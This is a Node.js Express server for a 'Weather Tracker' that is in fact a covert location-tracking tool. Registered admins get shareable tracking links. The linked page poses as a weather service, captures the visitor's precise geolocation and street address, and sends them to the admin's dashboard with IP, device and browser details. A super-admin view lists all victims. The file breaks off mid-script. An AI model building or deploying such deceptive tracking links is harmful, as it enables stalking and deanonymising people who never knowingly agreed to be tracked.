const express = require("express");
const cors = require("cors");
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const db = require('./database');
require("dotenv").config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

const JWT_SECRET = process.env.JWT_SECRET || 'slayer_weather_tracker_secret_2026';

function generateTrackingId() {
    return Math.random().toString(36).substring(2, 10);
}

function authenticateToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    
    if (!token) {
        return res.status(401).json({ error: "Access denied" });
    }

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ error: "Invalid token" });
        }
        req.user = user;
        next();
    });
}

// ============ ROUTES ============

app.get("/", (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Weather Tracker</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    padding: 20px;
                    margin: 0;
                }
                .container {
                    background: white;
                    border-radius: 20px;
                    padding: 50px;
                    max-width: 600px;
                    width: 100%;
                    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                    text-align: center;
                }
                h1 { color: #333; font-size: 2.5em; margin-bottom: 10px; }
                .subtitle { color: #888; margin-bottom: 30px; }
                .btn {
                    display: inline-block;
                    padding: 12px 30px;
                    background: #667eea;
                    color: white;
                    text-decoration: none;
                    border-radius: 10px;
                    margin: 10px;
                    transition: all 0.3s;
                }
                .btn:hover { background: #5a67d8; transform: translateY(-2px); }
                .credit { margin-top: 30px; color: #888; font-size: 14px; }
                .credit a { color: #667eea; text-decoration: none; }
                .features {
                    display: grid;
                    grid-template-columns: 1fr 1fr;
                    gap: 15px;
                    margin: 30px 0;
                }
                .feature {
                    background: #f8f9fa;
                    padding: 15px;
                    border-radius: 10px;
                }
                .feature .icon { font-size: 30px; }
                @media (max-width: 600px) {
                    .features { grid-template-columns: 1fr; }
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🌤️ Weather Tracker</h1>
                <p class="subtitle">Advanced Location & Weather Tracking System</p>
                <div class="features">
                    <div class="feature">
                        <div class="icon">📊</div>
                        <h3>Admin Panel</h3>
                        <p style="font-size: 12px; color: #888;">Track visitors & weather</p>
                    </div>
                    <div class="feature">
                        <div class="icon">👑</div>
                        <h3>Super Admin</h3>
                        <p style="font-size: 12px; color: #888;">Monitor all admins</p>
                    </div>
                    <div class="feature">
                        <div class="icon">🔗</div>
                        <h3>Shareable Links</h3>
                        <p style="font-size: 12px; color: #888;">Unique tracking URLs</p>
                    </div>
                    <div class="feature">
                        <div class="icon">🌦️</div>
                        <h3>Live Weather</h3>
                        <p style="font-size: 12px; color: #888;">Real-time updates</p>
                    </div>
                </div>
                <div>
                    <a href="/admin.html" class="btn">🔐 Admin Panel</a>
                    <a href="/superadmin.html" class="btn">👑 Super Admin</a>
                </div>
                <div class="credit">
                    Made by <b>Slayer</b> | <a href="https://t.me/voidxio" target="_blank">📱 Telegram</a>
                </div>
            </div>
        </body>
        </html>
    `);
});

// Admin Register
app.post("/api/admin/register", async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) {
        return res.status(400).json({ error: "Username and password required" });
    }
    if (password.length < 4) {
        return res.status(400).json({ error: "Password must be at least 4 characters" });
    }

    const trackingId = generateTrackingId();
    const hashedPassword = await bcrypt.hash(password, 10);

    db.run(
        'INSERT INTO admins (username, password, tracking_id) VALUES (?, ?, ?)',
        [username, hashedPassword, trackingId],
        function(err) {
            if (err) {
                if (err.message.includes('UNIQUE')) {
                    return res.status(400).json({ error: "Username already exists" });
                }
                return res.status(500).json({ error: "Database error" });
            }
            const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '24h' });
            res.json({
                success: true,
                message: "Admin created!",
                token: token,
                trackingUrl: `/track/${trackingId}`,
                fullUrl: `${req.protocol}://${req.get('host')}/track/${trackingId}`
            });
        }
    );
});

// Admin Login
app.post("/api/admin/login", async (req, res) => {
    const { username, password } = req.body;
    
    db.get('SELECT * FROM admins WHERE username = ?', [username], async (err, admin) => {
        if (err || !admin) {
            return res.status(401).json({ error: "Invalid credentials" });
        }

        const validPassword = await bcrypt.compare(password, admin.password);
        if (!validPassword) {
            return res.status(401).json({ error: "Invalid credentials" });
        }

        const token = jwt.sign({ username: admin.username }, JWT_SECRET, { expiresIn: '24h' });

        res.json({
            success: true,
            token: token,
            username: admin.username,
            trackingUrl: `/track/${admin.tracking_id}`
        });
    });
});

// Get Admin Data
app.get("/api/admin/data/:username", authenticateToken, (req, res) => {
    const { username } = req.params;
    
    if (req.user.username !== username) {
        return res.status(403).json({ error: "Access denied" });
    }

    db.get('SELECT * FROM admins WHERE username = ?', [username], (err, admin) => {
        if (err || !admin) {
            return res.status(404).json({ error: "Admin not found" });
        }

        db.all(
            'SELECT * FROM visitors WHERE admin_username = ? ORDER BY timestamp DESC',
            [username],
            (err, visitors) => {
                if (err) {
                    return res.status(500).json({ error: "Database error" });
                }

                const formattedVisitors = visitors.map(v => ({
                    id: v.id,
                    timestamp: v.timestamp,
                    location: v.location_lat ? {
                        lat: v.location_lat,
                        lon: v.location_lon,
                        accuracy: v.location_accuracy,
                        address: v.location_address || null
                    } : null,
                    ip: v.ip,
                    device: {
                        platform: v.device_platform,
                        language: v.device_language,
                        screenWidth: v.screen_width,
                        screenHeight: v.screen_height,
                        browser: v.browser_name,
                        browserVersion: v.browser_version
                    },
                    userAgent: v.user_agent
                }));

                res.json({
                    username: admin.username,
                    trackingUrl: `/track/${admin.tracking_id}`,
                    totalVisitors: visitors.length,
                    visitors: formattedVisitors
                });
            }
        );
    });
});

// Super Admin Login
app.post("/api/superadmin/login", async (req, res) => {
    const { username, password } = req.body;
    
    if (username !== 'superadmin') {
        return res.status(401).json({ error: "Invalid credentials" });
    }

    db.get('SELECT * FROM admins WHERE username = ?', ['superadmin'], async (err, admin) => {
        if (err || !admin) {
            return res.status(401).json({ error: "Invalid credentials" });
        }

        const validPassword = await bcrypt.compare(password, admin.password);
        if (!validPassword) {
            return res.status(401).json({ error: "Invalid credentials" });
        }

        const token = jwt.sign({ username: 'superadmin', role: 'superadmin' }, JWT_SECRET, { expiresIn: '24h' });

        res.json({
            success: true,
            token: token
        });
    });
});

// Get All Admins (Super Admin)
app.get("/api/superadmin/admins", authenticateToken, (req, res) => {
    if (req.user.role !== 'superadmin') {
        return res.status(403).json({ error: "Access denied" });
    }

    db.all('SELECT * FROM admins', [], (err, admins) => {
        if (err) {
            return res.status(500).json({ error: "Database error" });
        }

        const allAdmins = {};
        let completed = 0;
        
        if (admins.length === 0) {
            return res.json({
                success: true,
                totalAdmins: 0,
                admins: {}
            });
        }

        admins.forEach((admin) => {
            db.all(
                'SELECT * FROM visitors WHERE admin_username = ? ORDER BY timestamp DESC',
                [admin.username],
                (err, visitors) => {
                    const formattedVisitors = visitors ? visitors.map(v => ({
                        id: v.id,
                        timestamp: v.timestamp,
                        location: v.location_lat ? {
                            lat: v.location_lat,
                            lon: v.location_lon,
                            accuracy: v.location_accuracy,
                            address: v.location_address || null
                        } : null,
                        ip: v.ip,
                        device: {
                            platform: v.device_platform,
                            language: v.device_language,
                            screenWidth: v.screen_width,
                            screenHeight: v.screen_height
                        }
                    })) : [];

                    allAdmins[admin.username] = {
                        username: admin.username,
                        trackingId: admin.tracking_id,
                        totalVisitors: visitors ? visitors.length : 0,
                        visitors: formattedVisitors,
                        created: admin.created_at
                    };

                    completed++;
                    if (completed === admins.length) {
                        res.json({
                            success: true,
                            totalAdmins: admins.length,
                            admins: allAdmins
                        });
                    }
                }
            );
        });
    });
});

// Track Visitor
app.post("/api/track", (req, res) => {
    const { trackingId, adminUser, location, device, ip, browser, address } = req.body;
    
    db.get('SELECT * FROM admins WHERE username = ?', [adminUser], (err, admin) => {
        if (err || !admin) {
            return res.status(404).json({ error: "Admin not found" });
        }

        db.run(`
            INSERT INTO visitors (
                admin_username, 
                location_lat, 
                location_lon, 
                location_accuracy,
                location_address,
                ip,
                device_platform,
                device_language,
                screen_width,
                screen_height,
                user_agent,
                browser_name,
                browser_version
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        `, [
            adminUser,
            location?.lat || null,
            location?.lon || null,
            location?.accuracy || null,
            address || null,
            ip || req.ip || 'unknown',
            device?.platform || null,
            device?.language || null,
            device?.screenWidth || null,
            device?.screenHeight || null,
            device?.userAgent || null,
            browser?.name || null,
            browser?.version || null
        ], function(err) {
            if (err) {
                console.error('DB Error:', err);
                return res.status(500).json({ error: "Failed to save visitor" });
            }
            res.json({ success: true, message: "Data captured!", visitorId: this.lastID });
        });
    });
});

// Tracking Page
app.get("/track/:id", (req, res) => {
    const { id } = req.params;
    
    db.get('SELECT * FROM admins WHERE tracking_id = ?', [id], (err, admin) => {
        if (err || !admin) {
            return res.status(404).send(`
                <h1>❌ Invalid Tracking Link</h1>
                <p>This link does not exist or has been deactivated.</p>
                <p><a href="/">Go to Home</a></p>
            `);
        }

        const adminUsername = admin.username;

        res.send(`<!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Weather Tracker</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: Arial, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    padding: 20px;
                }
                .container {
                    background: white;
                    border-radius: 20px;
                    padding: 40px;
                    max-width: 500px;
                    width: 100%;
                    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                    text-align: center;
                }
                h1 { color: #333; margin-bottom: 20px; }
                .credit { color: #888; font-size: 12px; margin-top: 20px; }
                .credit a { color: #667eea; text-decoration: none; }
                .status {
                    padding: 15px;
                    border-radius: 10px;
                    margin: 20px 0;
                    background: #f0f0f0;
                    color: #666;
                }
                .weather-info {
                    background: #f8f9fa;
                    padding: 20px;
                    border-radius: 10px;
                    margin: 20px 0;
                }
                .weather-info p { margin: 8px 0; font-size: 16px; }
                #temp { font-size: 32px; font-weight: bold; color: #2c3e50; }
                button {
                    background: #667eea;
                    color: white;
                    border: none;
                    padding: 12px 30px;
                    border-radius: 10px;
                    font-size: 16px;
                    cursor: pointer;
                    margin: 10px 0;
                    width: 100%;
                }
                button:hover { background: #5a67d8; }
                button:disabled { opacity: 0.6; cursor: not-allowed; }
                #prediction {
                    margin-top: 20px;
                    padding: 20px;
                    background: #e8f0fe;
                    border-radius: 10px;
                    display: none;
                }
                .loading { animation: pulse 1.5s ease-in-out infinite; }
                @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🌤️ Weather Tracker</h1>
                <p style="color: #888; margin-bottom: 20px;">Share your location for weather updates</p>
                <div id="status" class="status loading">📍 Getting your location...</div>
                <div class="weather-info" id="weatherInfo" style="display: none;">
                    <p id="location">📍 Location: --</p>
                    <p id="address">📮 Address: --</p>
                    <p id="temp">🌡️ --°C</p>
                    <p id="condition">☁️ --</p>
                    <p id="humidity">💧 Humidity: --%</p>
                    <p id="wind">💨 Wind: -- m/s</p>
                </div>
                <button id="predictBtn" onclick="predictWeather()" disabled>🔮 Predict Weather (2 hours)</button>
                <div id="prediction">
                    <h3>2-Hour Prediction</h3>
                    <p>Current: <span id="currentTemp">--</span></p>
                    <p>Predicted: <span id="predictedTemp">--</span></p>
                    <p>Condition: <span id="predictedCondition">--</span></p>
                </div>
                <div class="credit">Made by <b>Slayer</b> | <a href="https://t.me/voidxio" target="_blank">📱 Telegram</a></div>
            </div>

            <script>
                let userLocation = null;
                let weatherData = null;
                let userAddress = null;
                const trackingId = "${id}";
                const adminUser = "${adminUsername}";

                window.onload = function() { getLocation(); };

                function getLocation() {
                    const status = document.getElementById('status');
                    if (!navigator.geolocation) {
                        status.textContent = '❌ Geolocation not supported';
                        return;
                    }
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            userLocation = {
                                lat: position.coords.latitude,
                                lon: position.coords.longitude
                            };
                            status.textContent = '✅ Location captured! Getting address...';
                            status.className = 'status';
                            await getAddress();
                            await sendToAdmin(position);
                            await getWeather();
                        },
                        (error) => {
                            status.textContent = '❌ Location access denied. Please enable location services.';
                            status.className = 'status';
                        }
                    );
                }

                async function getAddress() {
                    try {
                        const response = await fetch(
                            "https://nominatim.openstreetmap.org
